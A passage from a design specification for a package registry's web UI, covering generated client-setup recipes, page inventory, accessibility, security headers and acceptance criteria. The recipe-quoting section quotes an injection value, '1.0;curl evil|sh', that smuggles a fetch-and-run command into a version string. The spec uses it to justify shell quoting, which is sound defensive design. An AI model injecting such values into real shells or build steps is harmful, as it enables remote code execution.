caller cannot read indistinguishable from one that does not exist. A UI can break that without a
single bad API call, so the rules are explicit:

- A route for a repository the API answers `not-found` renders **one** not-found page, the same
  component with the same text, whether the name exists or not; the page never says "you may lack
  permission", because that sentence is true in exactly one of the two cases.
- The client never fetches a repository it did not receive in a listing except when the user
  navigated to its URL, and it never pre-fetches, autocompletes or "did you mean" across names the
  listing did not return. Search is server-side and returns only what the caller may read.
- Timing: the client renders not-found on the response, with no additional request in one branch,
  so the two cases take the same round trips. AC15 compares the two rendered documents and the two
  request sequences.
- What the API returns is what the page may show, and no more. A `virtual`'s member list reaches
  a caller holding `pull` on the virtual because `GET /api/v1/repositories/{name}` returns the
  type-specific configuration under `pull` (`management-api.md`'s endpoint table), and the
  administrator who added a member chose to expose that member's content through the virtual
  (`auth.md`, "Authorization is central"); the page renders the names it was given and performs
  no lookup of its own, so a member the caller cannot read links to the one not-found page. The
  search response groups by repository (`management-api.md` AC28); the page regroups by format
  from the format each repository carries, adding no request.

### The surface declaration: one source for snippets and conformance

**The problem.** Thirty-three ecosystems, fifty-plus client tools. A hand-written "how to configure
your client" page per format is thirty-three pages nobody tests, drifting from the day each is
written; the constitution's rule that the client, not the documentation, is the specification
applies to our own documentation too. The setup page must therefore be **generated from a
declaration a real client executes in CI**.

**The declaration.** Each handler package holds one embedded file, `internal/format/<name>/surface.yaml`,
parsed once at registration into a `surface.Declaration`:

```yaml
recipes:
  - id: npm-config            # stable id, referenced by conformance cases
    client: npm               # a client the catalogue's reach column names
    family: npm               # groups Yarn, pnpm and Bun under one card
    title: "npm, Yarn, pnpm"
    steps:
      - kind: shell
        template: |
          npm config set registry {{ .RepositoryURL }}
          npm config set //{{ .Host }}/{{ .RepositoryPath }}:_authToken {{ .Token }}
    variables: [RepositoryURL, Host, RepositoryPath, Token]
display:
  description: [description]              # keys in the version document, in preference order
  homepage: [homepage]
  licence: [license]
  readme: {key: readme, format: markdown}
  coordinate: "{{ .Package }}@{{ .Version }}"   # how the ecosystem writes the coordinate
```

- **Recipes** are `text/template` bodies over a closed variable set the renderer supplies:
  `RegistryURL` (from `server.public_url`), `Host`, `RepositoryName`, `RepositoryURL`,
  `RepositoryPath`, `Package`, `Version` (when rendering for a version page) and `Token`, which is
  a placeholder the setup page shows with a link to create a token and which the conformance runner
  fills from the case's `setup`-issued credential. A template referencing a variable outside the
  set fails at registration.
- **A step has a kind, and the kind decides the quoting.** The recheck of 2026-10-01 found the
  authoring draft rendered `Package` and `Version`, values a publisher chooses, into a shell
  line the conformance runner executes in the client container and a user pastes into a
  terminal: a version string `1.0;curl evil|sh` would have run. Two kinds exist. A `shell` step's
  template is rendered with every variable substituted as a POSIX single-quoted word (`'` inside a
  value becomes `'\''`), so a value is always data to the shell, and adjacent quoted words
  concatenate as the `//host/path:_authToken` line above needs. A `file` step names a `path`
  inside the client's home and a `template` for its content, for the clients configured by a
  file rather than a command (Maven's `settings.xml`, pip's `pip.conf`, NuGet's `NuGet.Config`,
  Cargo's `config.toml`); its variables carry no shell meaning, but they carry the file's, so a
  `file` template may reference a variable only through the escaping function the renderer
  provides for the declared `syntax` (`xml`, `toml`, `ini`, `json`, `url`), and a bare variable
  reference inside a `file` step fails registration exactly as an unknown variable does. Both
  rules are held by walking the parsed template (`text/template/parse`, the tree `Parse`
  returns) at registration, never by a regular expression over the source, so a reference the
  grammar admits in any spelling is seen. A `file` step's `path` is relative, contains no `..`
  segment and no leading `/` or `~`, checked at registration, because the runner writes it
  under the client's home and the page tells a user to do the same. The renderer's one
  third-party Go dependency is the YAML parser for `surface.yaml`, named at implementation;
  JSON would need none and was rejected because multi-line templates are its worst case. The
  rendered text is what the API returns, what the page shows and what the runner executes, so
  the quoting is proven by the same conformance case that proves the recipe.
- **Display hints** name which keys of the format's opaque metadata document mean description,
  homepage, licence and README, and how the ecosystem writes a coordinate (`hello@acme/stable` for
  Conan, `group:artifact:version` for Maven). Absent hints degrade to the generic rendering: the
  document as a collapsible key-value tree. The hints are where the charter's "per-format
  rendering contract" lives, and drawing them from nine real formats at step 9 is exactly the
  evidence order the charter wanted.
- **How the shared layer reaches it** without a sixth pinned method: the optional interface
  `surface.Declarer` with one method, `Surface() surface.Declaration`, type-asserted at
  registration, the same shape `management-api.md` adopted for its optional operation interface
  (the resolved declaration-home decision below); `format-handler-interface.md` records it in its
  optional-interfaces table ("Optional interfaces discovered at registration", its resolved
  optional-interfaces decision, was Q10) as one of the three kept beside the pin until the
  scheduled re-open judges each. A handler without it renders generically and
  offers no recipe, which AC17 turns into a failure: every registered format must declare at least
  one recipe, because a format with no way to configure its client from the UI is Gitea's feature
  set, not ours.
- **Cost attribution** follows the charter's path rule mechanically: `surface.yaml` under
  `internal/format/<name>/` is `format:<name>`; the renderer and the declaration types under
  `internal/surface/` are `shared:ui`.

**The two consumers.**

1. **The API** serves `GET /api/v1/repositories/{name}/recipes` under `pull` (`management-api.md`'s
   endpoint table, its AC28): every recipe of the repository's format rendered for that repository
   with `Token` left as the placeholder, plus the raw templates. Automation gets the same snippet a
   human does; the UI's setup page is a rendering of this response and holds no template of its own.
2. **The conformance runner.** A case's `client` block carries a `recipe:` field naming a recipe
   id; the runner renders it through `internal/surface` with the case's registry URL and credential
   and runs the rendered steps inside the client container before `script`
   (`conformance-harness.md`, "Case definition"; `setup` stays server-side and closed). Two
   validator rules complete the loop, both in that spec's AC26: a case naming an undeclared recipe
   id is rejected before any container starts, and every declared recipe is named by at least one
   passing case in the format's suite (a recipe named only by failing cases fails the run), so no
   snippet reaches the setup page without a real client having run it.

The AC11 flow closes the loop from the other side: the e2e suite copies the snippet the setup page
shows for the remote repository it just created, runs it verbatim in the harness's client
container, and installs through the proxy.

### The stack

- **TypeScript and React** (the constitution's stack line), Vite for the build, React Router for
  client routing under `/ui/`, TanStack Query for server state (request deduplication, cache
  invalidation on writes, retry policy set to none on `4xx`), and **React Aria Components** for
  the interactive primitives (dialog, menu, combobox, listbox, tabs, table) because the
  accessibility criteria below are met or missed inside those widgets and hand-rolled ones miss
  them (the resolved component-library decision below). Styling is plain CSS with custom
  properties for the design tokens, no runtime CSS-in-JS: the CSP forbids inline styles and a
  runtime injector needs them.
- **The API client is generated** from `internal/manage/openapi/v1.yaml` with `openapi-typescript`
  into `web/src/api/schema.d.ts`, committed, and a `make verify` step regenerates and diffs it, the
  same discipline `management-api.md` AC25 applies to the document itself. A UI call to a route
  absent from the document does not type-check, which is the compile-time half of "no private
  endpoint".
- **Errors** are `application/problem+json` rendered by one component: `title`, `detail`, the
  extension members the type defines (the refused coordinates, the `in-use` members, the reach of
  a repoint) and the response's `X-Request-Id`, shown with a copy button so a user can hand an
  operator the correlation id `observability.md` logs against. No error string is invented
  client-side for a server refusal.
- **Design tokens** cover colour (with a dark scheme through `prefers-color-scheme`), type scale,
  spacing, radius and focus ring; every state colour pairs with a text label or icon, so no
  information is colour-only (WCAG 1.4.1). Contrast is 4.5:1 for text and 3:1 for UI components in
  both schemes, checked by axe.
- **Configuration**, following the `cobra-viper` skill through `deployment.md`'s schema, typed into
  `ui.Config`. The keys this spec owns, in the three-column shape `scripts/check-config-keys.js`
  (`deployment.md` Phase 1; not in the tree yet) parses against that schema (`deployment.md`
  carries them in its key inventory as the `ui.` row):

  | Key | Default | Meaning |
  |---|---|---|
  | `ui.instance_name` | `Stackweaver Registry` | The instance name in the header and the document title (AC26) |
  | `ui.help_url` | `https://github.com/vhco-pro/stackweaver-registry/tree/main/docs` | The help link WCAG 3.2.6 needs in a consistent place on every page (AC26) |

  No key disables the UI (charter AC11: "behind no licence or feature flag"), and no third `ui.`
  key exists.

### Page inventory

Every page below is a rendering of API resources named in `management-api.md` or in the sibling
consequences; the "API" column is the contract the page is written against. "Anyone" means the
anonymous principal, subject to visibility.

| Page | Who | What it shows and does | API |
|---|---|---|---|
| **Repositories** (`/ui/`) | anyone | Every repository the caller may read: name, format, type (`local`, `remote`, `virtual`), visibility, read-only flag; filters by format and type; the admin additionally sees the deleted listing by identity, awaiting reclamation, read through `GET /api/v1/repositories?state=deleted` (a filter value on the collection route, never a path of its own) | `GET /api/v1/repositories` (`?state=deleted` for the admin); `GET /api/v1/formats` |
| **Search** (`/ui/search`) | anyone | Package name search across every readable repository, results grouped by format with the coordinate rendered by the format's display hint; a caller with no readable repository gets an empty page, never a refusal | `GET /api/v1/search?q=` (`management-api.md` AC28; `data-model.md` AC42's index) |
| **Repository** (`/ui/r/{name}`) | `pull` | Tabs: Packages, Set up client, Pointers, Operations, Trust, Refusals, and for the admin Settings, Grants, Replication; a `remote` shows its upstream and, to a caller holding an unpatterned `push`, a "refresh now" action that marks its cached metadata due for revalidation and leaves one `refresh` operation; a `virtual` its ordered members | repository read; package listing; recipes; pointers; operations; trust; refusals; `POST /api/v1/repositories/{name}/refresh` (`push`, `remote` only; `management-api.md` AC29) |
| **Package** (`/ui/r/{name}/p/{package}`) | `pull` | Versions newest first with withdrawn and retired state, the package-level document (npm dist-tags, Maven `latest`) through the display hints, the client snippet for this package; the `delete-package` action to a caller holding `delete` | package and version listings; retirements; recipes with `Package`; `POST .../operations` |
| **Version** (`/ui/r/{name}/p/{package}/v/{version}`) | `pull` | Files with digest and size, the version document (description, licence, homepage, README via hints, else the tree), verdicts per file (verified, failed, absent, with scheme, identity and reason), refusals, references, provenance and upstream origin of cached files, Swift's signing entity, Hex's key fingerprint; actions from `management-api.md`'s kind table by grant: `annotate` and `detach` under `push`, `withdraw`, `restore`, `delete-file` and `delete-version` under `delete` (retirement is the core-held consequence of a deleting kind, never an action of its own) | version and file reads; verdicts; refusals; `POST .../operations` |
| **Set up client** (`/ui/r/{name}/setup`) | `pull` | One card per recipe family; the client picker within a family (Maven, Gradle, SBT, Ivy, Leiningen); each step rendered with copy buttons; the `Token` placeholder links to token creation | recipes |
| **Pointers** | `pull`; writes `push`/`delete` | Each pointer with target snapshot, write time and how far rollback reaches; a pointer outside the retention window flagged with how far it has aged (storage AC19, the pinned-storage view); create, repoint, roll back (target another pointer or an in-reach snapshot), delete a named pointer | pointer listing and writes |
| **Operations** | `pull`; admin registry-wide | Per repository, and registry-wide for the admin (`/ui/operations`): kind, target, state, principal (display name), request id, filters by kind, principal, state and time; detail with the result document or the problem; cancel on a pending or running operation, offered when the record's principal is the session's or the session is the admin's, and refused `not-found` by the API to anyone else (`async-operations.md` AC5); this registry-wide listing is the history view the authoring pass called "Audit" (Scope, "An audit log page"). The per-repository listing is a `pull` read, so on a public repository it shows every visitor who ran what; that is the API's disclosure, rendered as given, and is reported to `management-api.md` as a consequence to state or narrow | `GET .../operations`, `GET /api/v1/operations` (admin), `GET /api/v1/operations/{id}`, `POST .../cancel` |
| **Jobs** (`/ui/jobs`, admin) | admin | The queue behind the operations: jobs by kind, state and repository with attempts, lease and last error; cancel a job; pause and resume a **kind** (`async-operations.md` AC10: pause stops claims while running jobs finish), shown as a per-kind switch with the pausing principal and time from the kind-state record, never as a per-job action | `GET /api/v1/system/jobs`, `POST .../jobs/{id}/cancel`, `POST`/`DELETE .../jobs/kinds/{kind}/pause` |
| **Trust** | `pull`; admin writes | The repository's trust set and revision, keys with fingerprints in the form the ecosystem's client prints (`SHA256:` for Hex), import from keyserver or upstream | trust routes |
| **Refusals** | `pull` | Every policy refusal for the repository: coordinate, digests, rule, advisory or signal, sources of a condemnation, whether the bytes are still held | `GET .../refusals` |
| **Settings** (admin) | admin | Type-specific forms: visibility, retention rules, the format's `settings` document validated by the handler (offered only when `GET /api/v1/formats` shows the handler declares `configure`), the `policy` document with its rules and, on a `local` only, `coordinate_exemptions` (`supply-chain-policy.md` AC25; the field is absent from the form on a `remote` or `virtual`, and the API's `validation` refusal is rendered if forged) and `advisory_ecosystem` for the OS-package formats, upstream URL, adapter, download policy and credential reference for a `remote`, ordered members for a `virtual` with move-up and move-down buttons and a text position field (WCAG 2.5.7: no drag-only ordering); freeze and thaw; rename, refused with the format's reason when its capability is `unsupported`, and on success showing the `unbound_hosts` the lifecycle `Operation` records so the operator knows a host binding needs editing (`repository-lifecycle.md` AC28); delete | repository `PATCH`; lifecycle operations |
| **Replication** (admin tab) | admin | The repository's link, if any: leader URL and repository, credential by name, status and reason, position, sync interval and the takeover record; create a link (refused `validation` on a `remote` or `virtual`, rendered), edit its four fields, sync now (answers 202; progress is the link status and its job on the Jobs page), re-seed behind the identity confirmation the dialog below uses (the discarded snapshots the API lists are shown before the second confirmation), takeover behind an explicit fencing acknowledgement whose text names the duty (`replication.md` AC16; the `conflict` naming unresolved signing keys is rendered), delete the link; export and import are absent by Scope | `.../replication`, `.../replication/sync`, `.../reseed`, `.../takeover` |
| **Delete repository** (admin) | admin | A dialog naming the repository, its type, its member-of relationships and the reclamation behaviour, with `reclaim: now` as an unchecked option the admin may set; the admin types the repository **name** to confirm and the client sends the **identity** the page loaded as `confirm`, so a delete-and-recreate race between page load and submit is refused by the API (lifecycle AC19); an `in-use` refusal lists each virtual member and offers `detach` behind a second confirmation | repository delete |
| **Create repository** (`/ui/new`, admin) | admin | Format picker from the formats listing (only registered formats, with proxy and virtual capability shown), type, name, visibility, then the type's fields; success lands on the new repository's setup tab, which is where the AC11 flow copies its snippet | repository create; formats listing |
| **Tokens** (`/ui/tokens`) | signed in | `credential-management.md` AC23: the caller's tokens with state badge and `expires_at`, `expiring` distinct from `active` by icon, label and colour; create with scope picker, the secret shown once in a dismissable panel that no navigation, refresh or history step brings back; revoke moves the row to `revoked` and keeps it listed; a second section for the caller's registered public keys (`credential-management.md` AC12): register by pasting a PEM under a name, the fingerprint shown on the row, revoke keeps it listed as `revoked`; the key is public, so nothing here is display-once | `/api/v1/tokens`, `/api/v1/keys` |
| **Robots** (`/ui/robots`, admin) | admin | Robots with description and state; create, disable, mint a token, the trust policy for OIDC exchange | `/api/v1/robots` |
| **Grants** (admin) | admin | Per repository and per principal: `(principal, repository, action, pattern)`; create and revoke; the principal picker is a listing of principals with kind and display name (`GET /api/v1/principals`, admin; a route no sibling tables yet, reported to `management-api.md` by this recheck, since the `Principal` entity exists in `data-model.md` and the admin otherwise has no way to name a human who has signed in), never a free-text `(issuer, subject)` field | grants routes; the principal listing |
| **Upstream credentials** (`/ui/upstream-credentials`, admin) | admin | Name, kind, last rotation; create, rotate, delete, the `in-use` refusal listing the upstream or link that still references it; the value is write-only and the UI has no field that could display it | upstream credential routes |
| **Sign in** (`/ui/signin`) | anyone | Without a `flow` query parameter, one "Sign in" link to `GET /ui/auth/login` carrying the current path as `return_to` (the server decides between the provider and the form); with one, the local admin form (username, password, the flow token hidden) as a native form post to `POST /ui/auth/login`; no page of the SPA needs to know whether a provider is configured, so `GET /api/v1/session` gains nothing for this | `internal/auth`'s three routes |
| **Not found** | anyone | One page for missing and forbidden alike | any `not-found` |

Three rules cut across every page:

- **Pagination everywhere the API paginates**: the client follows `Link: rel="next"` with the opaque
  cursor and never asks for an unbounded list. Trees (generic's paths, Debian's pools) are derived
  client-side from the flat listing one page at a time, Nexus's lesson without Nexus's cap.
- **A coordinate is one route segment, whatever it contains.** Package names carry slashes
  (OCI's `library/nginx`, npm's `@scope/name`, Maven's `group:artifact`, generic's paths) and
  characters the URL grammar reserves; the client router encodes each coordinate as exactly
  one path segment (`encodeURIComponent` on the way out, the router's decoded parameter on the
  way in) and builds every `/api/v1` path the same way, so a name is never split into route
  segments, never reaches the API as a different path from the one the page shows, and never
  reaches it unencoded. `web/e2e/browse.spec.ts` seeds one slash-bearing and one
  reserved-character coordinate per format whose grammar admits them.
- **Actions are rendered from grants and re-decided by the API.** A user without `delete` does not
  see the delete action; a user who forges the request gets the API's `unauthorized`, which the
  UI renders as it renders any problem. Hiding is a courtesy, never the control.

### Accessibility: WCAG 2.2 AA, by named decision

axe-core runs in every Playwright page test with the rule tags `wcag2a`, `wcag2aa`, `wcag21a`,
`wcag21aa` and `wcag22aa`, and any violation fails the test (AC20). axe cannot see everything, so the
criteria it cannot check are each held by a design rule and a targeted test:

| Criterion | Design rule | Held by |
|---|---|---|
| 2.1.1 Keyboard, 2.4.3 Focus Order, 2.4.7 Focus Visible | Every action reachable by Tab and activated by Enter or Space; a visible focus ring from the tokens on every focusable element; dialogs trap and return focus | `web/e2e/keyboard.spec.ts` drives the AC11 flow with the keyboard alone |
| 2.4.11 Focus Not Obscured (Minimum) | Sticky headers and toasts never cover the focused element; `scroll-padding` set to the header height | keyboard spec asserts the focused element's bounding box intersects the viewport minus sticky regions |
| 2.5.7 Dragging Movements | Virtual member ordering and every reorder has move-up, move-down and a numeric position field | settings spec reorders without pointer drag |
| 2.5.8 Target Size (Minimum) | Every interactive target at least 24 by 24 CSS pixels or spaced so; inline text links exempt as the criterion allows | axe `target-size` rule plus a spec measuring icon buttons |
| 3.2.6 Consistent Help | The help link (`ui.help_url`) sits in the same header position on every page | header component test |
| 3.3.7 Redundant Entry | Multi-step forms (create repository) keep entered values across steps and on a refused submit | create spec asserts values survive a `validation` refusal |
| 3.3.8 Accessible Authentication | No CAPTCHA, no puzzle; paste and autofill permitted on the local admin form | sign-in spec pastes the credential |
| 1.4.1 Use of Colour, 1.4.3 Contrast | State badges carry text and icon; tokens verified at 4.5:1 and 3:1 in both schemes | axe `color-contrast` in light and dark |
| 1.4.13, 2.3.3 | Tooltips dismissable by Escape; `prefers-reduced-motion` disables transitions | component tests |
| 4.1.2 Name, Role, Value | Widgets from React Aria Components; custom components carry explicit roles and labels; every table has a caption and column headers | axe |

Live regions announce list refreshes and operation state changes (`aria-live="polite"`), and the
document `lang` is set from the catalogue's locale.

### Performance budgets

"Fast" is not an exit code, so it is a gate:

- **Bundle**: the initial route's JavaScript at most 250 KB compressed, the whole application at
  most 800 KB compressed, measured after the build by a check in `make verify` that fails on
  regression (AC21). Routes load their chunks lazily.
- **Lists**: the repositories page with 10,000 seeded repositories and a package page with 10,000
  versions each render their first page and become interactive within 2 s of navigation on the CI
  runner, measured in the e2e suite (AC22); tables virtualise rows beyond the first page.

### Testing strategy

- **Unit** (Vitest, React Testing Library): components, the problem renderer, the recipe card,
  the sanitiser allowlist, the CSRF header injection in the API client.
- **Server** (`go test ./internal/ui/... ./internal/surface/...`): SPA fallback, redirect from `/`,
  cache headers, security headers present and absent, embedded placeholder detection, recipe
  rendering and variable-set validation, the architecture tests.
- **End to end** (Playwright, `web/e2e/`, browsers installed by `npx playwright install` and
  `PLAYWRIGHT_BROWSERS_PATH` honoured where an environment sets one):
  against the `make build` binary with PostgreSQL, an S3-compatible store, an OIDC stand-in
  container (the provider `auth.md` AC1's first container is), a fixture upstream from the
  conformance harness and the harness's real client image for the proxied install. Each spec
  seeds state through the API or the `seed` subcommand (`conformance-harness.md`'s seed path),
  never through SQL. Chromium on every run; Chromium, Firefox and WebKit on the main-gated job that
  runs conformance (the resolved browser-matrix decision below). The suite also runs the network
  audit, the axe checks and the existence-oracle comparison. The AC8 flow's last step runs the
  copied snippet in the harness's client image through the harness runner itself, invoked as a
  subprocess with the rendered steps and the case network (a single-recipe entry of
  `conformance/core`, reported to `conformance-harness.md` by this recheck; the Playwright process
  never talks to a container runtime directly), so the snippet is executed by exactly the code
  path a conformance case uses.
- **Contract**: the generated API types regenerate identically from the checked-in OpenAPI
  document; the surface declarations validate; every recipe is exercised by a conformance case.

### Mechanical enforcers

Each boundary this spec introduces and the test that holds it, per the constitution's rule that a
boundary enforced only by review is not enforced:

| Boundary | Enforcer |
|---|---|
| `internal/ui` registers only the static routes and the root redirect, and imports no model, storage, management or handler package | `internal/ui/arch_test.go` (route table and import graph) |
| No UI-only capability: every browser request during the e2e suite is `/ui/*` or `/api/v1/*` | `web/e2e/network-audit.ts`, a fixture every spec installs |
| No API call outside the OpenAPI document | generated `schema.d.ts` type check; `make verify` regeneration diff |
| Security headers on `/ui/*` only; no inline script or style in the bundle | `internal/ui/headers_test.go`; `web/scripts/check-bundle.mjs` in `make verify` |
| The tracked placeholder is never replaced by a built page in a commit | the `make verify` step in `scripts/verify-local.sh` comparing the staged `internal/ui/dist/index.html` with `internal/ui/placeholder.html` |
| A document value becomes an `href` only through `web/src/lib/links.ts`, and only as `http` or `https`; HTML is injected only by the sanitised Markdown component | `web/src/lib/links.test.ts`; ESLint `react/no-danger` with one file-scoped exception |
| A coordinate is always one encoded route segment, in the client router and in every `/api/v1` path the client builds | `web/src/lib/routes.test.ts` (round trip over slash-bearing and reserved-character names); `web/e2e/browse.spec.ts` |
| A publisher-chosen value never reaches a shell or a config file unquoted | `internal/surface/render_test.go` (metacharacter table per step kind; bare variable in a `file` step refused) |
| `ui` is a reserved segment and `/` is not claimable | `format-handler-interface.md` AC11's `internal/format/register_test.go`, with a fixture handler named `ui` (its reserved table lists `ui` and exactly `/` with this spec as owner) |
| Every registered format declares at least one recipe; every recipe renders with the closed variable set; every recipe is named by a passing conformance case | `internal/surface/declaration_test.go` over the handler registry; `conformance/core/case_validate_test.go` (the two validator rules, `conformance-harness.md` AC26) |
| Missing and forbidden render identically | `web/e2e/existence-oracle.spec.ts` (DOM and request-sequence equality) |
| Cookie-authenticated unsafe requests carry CSRF; bearer ones need not | `internal/auth/session_test.go` (auth AC22); `web/e2e/csrf.spec.ts` (a cross-site form post is refused) |
| WCAG 2.2 AA | `@axe-core/playwright` in every page spec; the targeted specs in the table above |
| Budgets | `web/scripts/check-bundle.mjs` size check; `web/e2e/perf.spec.ts` |

## Acceptance Criteria

Each criterion is independently testable and states an end state.

- [ ] AC1: The binary produced by `make build`, the container image and the GoReleaser archives
      serve the web UI at `/ui/` with no licence, feature flag or configuration key able to
      disable it, and `GET /` answers `302` to `/ui/`; a binary built without the web step serves
      the placeholder page and fails the e2e suite's first navigation; and a commit that stages a
      built `internal/ui/dist/index.html` over the placeholder is refused by `make verify`.
- [ ] AC2: `ui` is held in `format-handler-interface.md`'s reserved list: registering a handler
      named `ui`, or one claiming a root-anchored mount under `/ui/` or at exactly `/`, fails
      registration before the server serves any request.
- [ ] AC3: Every response under `/ui/`, the three auth routes included, carries the Content
      Security Policy (with `img-src 'self'` and no `data:`), `X-Content-Type-Options`,
      `Referrer-Policy` and `Cross-Origin-Opener-Policy` values in Design, and no response on a
      handler route or under `/api/v1/` carries any of them; the built bundle contains no inline
      script, inline event handler, inline style attribute or `data:` asset.
- [ ] AC4: A user completing the OIDC Authorization Code flow with PKCE against the stand-in
      provider lands signed in with a session cookie set HttpOnly, Secure and `SameSite=Lax`, sees
      their display name, and is returned to the `/ui/` path the sign-in started from; a
      `return_to` naming another origin, a scheme or a protocol-relative path lands on `/ui/`
      instead; a callback presented to a browser holding no pre-authentication cookie for that
      flow is refused and issues no session; after `POST /ui/auth/logout` the old cookie no longer
      authenticates any `/api/v1` request and a `GET` to the logout route changes nothing; with no
      provider configured, `GET /ui/auth/login` lands on `/ui/signin` with a flow token, the local
      admin credential signs in through the SPA's form and `POST /ui/auth/login`, and the same
      post without the token, with a token from another browser's flow, or replayed after the
      flow was consumed is refused and issues no session.
- [ ] AC5: A signed-in user browses every registered format: for each format with a conformance
      suite, the e2e suite seeds one package with one version and one file and asserts the
      repository, package and version pages render its coordinate, version, file digest and size,
      that a format whose name grammar admits a slash or a URL-reserved character renders and
      links such a package under one encoded route segment, and that a format whose surface
      declaration carries display hints renders description, licence and homepage from its
      document while one without renders the document tree.
- [ ] AC6: Search returns packages from every repository the caller may read and none from any
      other, grouped by format, and an anonymous caller's search returns only packages of public
      repositories.
- [ ] AC7: The setup page for a repository shows one card per recipe family of its format, each
      step rendered with the registry URL, repository and a token placeholder, and the rendered
      text equals byte for byte what `GET /api/v1/repositories/{name}/recipes` returns.
- [ ] AC8: An administrator creates a `remote` repository with its upstream through the UI, the
      repository appears in the listing with its type and upstream, and the snippet copied from
      its setup page, executed verbatim in the harness's client container for that format with a
      token created in the UI, installs a package through the proxy from the fixture upstream
      (charter AC11's flow, end to end).
- [ ] AC9: Deleting a repository requires typing its name, the request carries the identity the
      page loaded and `reclaim: now` only when the admin chose it, and a repository deleted and
      recreated under the same name between page load and submit is not deleted (the API's
      `validation` refusal is rendered); an `in-use` refusal lists each virtual member by name and
      the `detach` option is offered only after a second confirmation.
- [ ] AC10: Freeze, thaw and rename are performed from the settings page; a frozen repository shows
      its read-only state on every page that names it; renaming a repository whose format declares
      `Rename: unsupported` is refused with the format's reason shown; and a `remote` repository's
      "refresh now" action sends `POST /api/v1/repositories/{name}/refresh`, is offered only to a
      caller holding `push`, completes, and is recorded as a `refresh` operation the Operations
      tab then lists.
- [ ] AC11: The pointers tab lists each pointer with target, write time and reach, flags a pointer
      whose target is outside the retention window with how far it has aged and flags none inside
      it; creating, repointing, rolling back and deleting a named pointer succeed by grant and an
      out-of-reach target renders the API's reach.
- [ ] AC12: The token page meets `credential-management.md` AC23 in a real browser: state and
      `expires_at` on every row, `expiring` distinct from `active` by more than colour, the
      created secret shown once and absent after navigation, browser back and reload, revoke
      moving the row to `revoked`; the same page registers a PEM public key under a name, shows
      its fingerprint and lists it as `revoked` after revocation (its AC12); and the admin's robot
      page creates, disables and mints.
- [ ] AC13: Every unsafe request the UI sends carries `X-CSRF-Token` matching the `stackweaver_csrf`
      cookie; a cross-site form post to a `/api/v1` write with the session cookie and no header is
      refused and changes nothing; a request whose `stackweaver_csrf` cookie was replaced by a
      value the session never issued, with a header equal to that planted value, is refused and
      changes nothing; a bearer-token request without the header succeeds.
- [ ] AC14: Actions render from the caller's grants: a principal holding `pull` alone sees no
      write action on a repository, one holding `push` sees publish-class actions and not delete,
      and the admin alone sees settings, grants, the replication tab, the registry-wide
      operations page and the jobs page; a forged request from the hidden state is refused by
      the API and rendered as its problem.
- [ ] AC15: Navigating to a private repository the caller cannot read and to a repository that does
      not exist renders identical documents (same DOM, same text) after identical request
      sequences, and no page, search or picker reveals a name the caller's listing did not return.
- [ ] AC16: Every API refusal is rendered from its `application/problem+json` body with its
      `title`, `detail`, its type's extension members and the response's `X-Request-Id` with a copy
      action, and no client-side string substitutes for a server refusal.
- [ ] AC17: Every registered format's handler declares a surface with at least one recipe; a
      recipe referencing a variable outside the closed set, a `file` step referencing a variable
      without its syntax's escaping function, a `file` step whose `path` is absolute, starts
      with `~` or contains a `..` segment, or a display hint naming a key type the renderer
      does not know, fails registration; a `shell` step renders a `Package` or `Version` value
      holding `;`, `|`, `$(`, a quote or a newline as one single-quoted word the shell executes as
      data; and every declared recipe is named by at least one passing conformance case of its
      format, with a case naming an undeclared recipe rejected before any container starts (the
      two validator rules of `conformance-harness.md` AC26).
- [ ] AC18: The version page renders each file's verdict (verified, failed or absent, with scheme,
      identity and reason), the repository's refusals with rule, advisory or signal and sources
      after the refused blob has been purged, the trust set with keys shown with the fingerprint
      form the ecosystem's client prints, and the operations list offers cancel to the originating
      principal and the admin, whose cancel ends the operation `cancelled`, while a third principal
      sees no cancel action and a forged cancel is rendered as the API's `not-found`.
- [ ] AC19: Markdown from package documents renders with the allowlist only: a README containing a
      script element, an inline event handler, a `javascript:` link, a `data:` image and a remote
      image renders with the script and handler removed, the link inert, the `data:` image as
      text and the remote image as a link, and the page's CSP reports no violation; a `homepage`
      hint, a verdict identity and an advisory reference holding a `javascript:` or `data:` URL
      render as text, and only `http` or `https` values become anchors.
- [ ] AC20: Every page in the e2e suite passes axe-core with the WCAG 2.0, 2.1 and 2.2 A and AA rule
      tags in both colour schemes with zero violations, and the AC8 flow completes with the
      keyboard alone with the focused element visible at every step.
- [ ] AC21: The initial route's JavaScript is at most 250 KB compressed and the whole application
      at most 800 KB compressed after every build, enforced in `make verify`.
- [ ] AC22: With 10,000 repositories seeded, the repositories page renders its first page and
      accepts input within 2 s of navigation, and a package with 10,000 versions does the same,
      on the CI runner.
- [ ] AC23: `internal/ui` registers only the static asset routes and the root redirect, imports no
      model, storage, management or handler package, and every request the browser makes during
      the e2e suite has a path under `/ui/` or `/api/v1/`, with the OIDC provider's origin the only
      foreign one and only during sign-in.
- [ ] AC24: The committed `web/src/api/schema.d.ts` equals the one generated from
      `internal/manage/openapi/v1.yaml`, and a UI module calling a path absent from it fails the
      type check.
- [ ] AC25: The pinned-storage view shows every deleted repository awaiting reclamation by
      identity (read through `GET /api/v1/repositories?state=deleted`) and every out-of-window
      pointer with its age to the admin, and neither to a non-admin (whose `?state=deleted`
      request the API refuses and the page never sends), and no page renders a rate, latency or
      other time series.
- [ ] AC26: The header on every page shows `ui.instance_name` as the instance name and the document
      title, and a help link to `ui.help_url` in the same position on every page, with both keys
      carrying their defaults when unset and neither able to disable the UI.
- [ ] AC27: The admin's Jobs page lists jobs by kind, state and repository, cancels a pending job
      so it ends `cancelled` and never runs, and pauses a kind the suite can enqueue through the
      API (`manage.apply`, enqueued by a deferred operation of a seeded format, the hold
      `async-operations.md` AC10 uses for the Galaxy import) so that a job of that kind enqueued
      afterwards stays `pending` until the kind is resumed and then completes, with the pausing
      principal and time shown while paused; a non-admin session never renders the page and never
      sends a `/api/v1/system/jobs` request.
- [ ] AC28: The admin creates a grant `(principal, repository, action, pattern)` by picking the
      principal from the listing and revokes it, and the granted principal's next session load
      shows the action the grant confers and, after revocation, does not; the admin creates an
      upstream credential without its value ever being readable back, rotates it, and a delete
      while an upstream references it is rendered as the API's `in-use` naming that upstream.
- [ ] AC29: The Replication tab shows a linked repository's leader, status, reason and position,
      creates and deletes a link, triggers a sync that the Jobs page then lists, re-seeds only
      after the identity confirmation with the discarded snapshots shown, and takes over only
      after the fencing acknowledgement, rendering the `conflict` that names an unresolved signing
      key; the tab offers no export or import.

## Test Plan

| Criterion | Test Type | Test Location |
|-----------|-----------|---------------|
